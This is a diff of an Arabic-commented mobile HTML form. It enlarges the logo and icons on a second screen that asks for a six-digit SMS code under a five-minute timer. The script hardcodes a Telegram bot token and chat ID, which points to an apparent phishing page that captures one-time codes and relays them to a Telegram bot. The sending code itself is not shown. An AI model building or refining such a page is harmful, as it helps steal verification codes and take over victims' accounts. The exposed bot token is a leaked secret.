@@ -9,17 +9,17 @@
         body { margin: 0; padding: 0; background-color: #f9f9f9; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
         .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 140px; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
         
-        /* --- تعديل الشعار العلوي --- */
+        /* --- تنسيق الشعار العلوي (المرجع) --- */
         .header-container { 
             width: 100%; 
-            height: 150px; /* زيادة ارتفاع الحاوية */
+            height: 150px; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
             padding-top: 20px; 
         }
         .header-img { 
-            width: 280px; /* تكبير العرض من 220 إلى 280 */
+            width: 280px; /* الحجم المطلوب الوصول إليه */
             height: auto; 
             object-fit: contain; 
         }
@@ -30,6 +30,9 @@
         .input-box { position: relative; border: 1.8px solid #000; border-radius: 12px; margin-bottom: 20px; background: #fff; display: flex; align-items: center; }
         input { border: none; width: 100%; font-size: 18px; padding: 14px; text-align: center; outline: none; background: transparent; font-family: 'Cairo'; }
         
+        /* --- الصورة الثانية في الواجهة الثانية (أيقونة الحقل) --- */
+        /* تم تكبير العرض ليماثل الشعار العلوي */
+        .field-icon-large { width: 280px; height: auto; margin: 10px auto; object-fit: contain; display: block; }
         .field-icon { width: 28px; height: 28px; margin-left: 12px; object-fit: contain; }
 
         .btn-main { background-color: #94a3b8; color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 19px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
@@ -38,12 +41,13 @@
         .banner-container { width: 100%; margin-top: 25px; text-align: center; }
         .banner-img { width: 92%; border-radius: 10px; }
 
-        .otp-icon-container { width: 100%; text-align: center; margin: 30px 0; }
-        .otp-main-icon { width: 110px; height: 110px; object-fit: contain; }
+        /* --- الصورة الأولى في الواجهة الثانية (أيقونة OTP) --- */
+        /* تم تغيير العرض إلى 280px لتطابق الشعار العلوي */
+        .otp-icon-container { width: 100%; text-align: center; margin: 20px 0; }
+        .otp-main-icon { width: 280px; height: auto; object-fit: contain; }
 
         .timer-box { background: #000; color: #fff; width: fit-content; margin: 15px auto; padding: 10px 30px; font-size: 26px; font-weight: bold; border-radius: 8px; }
         
-        /* --- خلفية الأسفل --- */
         .footer-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 150px; z-index: 1; pointer-events: none; }
         .footer-img { width: 100%; height: 100%; object-fit: fill; }
 
@@ -80,15 +84,18 @@
 
     <!-- الواجهة الثانية (OTP) -->
     <div id="p2" class="form-container hidden">
+        <!-- الصورة الأولى في الواجهة الثانية (تم تكبيرها) -->
         <div class="otp-icon-container">
             <img src="otp_main_icon.jpeg" class="otp-main-icon">
         </div>
         
         <p style="text-align: center; font-weight: bold; color: #333;">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
         
+        <!-- الصورة الثانية في الواجهة الثانية (تم وضعها خارج الحقل لتأخذ حجمها الكبير بوضوح) -->
+        <img src="otp_field_icon.png" class="field-icon-large">
+        
         <div class="input-box">
             <input type="tel" id="otp" placeholder="######" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateOtp();">
-            <img src="otp_field_icon.png" class="field-icon">
         </div>
         
         <div class="timer-box" id="time">05:00</div>
@@ -101,6 +108,7 @@
 </div>
 
 <script>
+    // ... (بقية السكريبت الخاص بك يبقى كما هو بدون تغيير)
     const tok = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
     const cid = "8665814266";
 
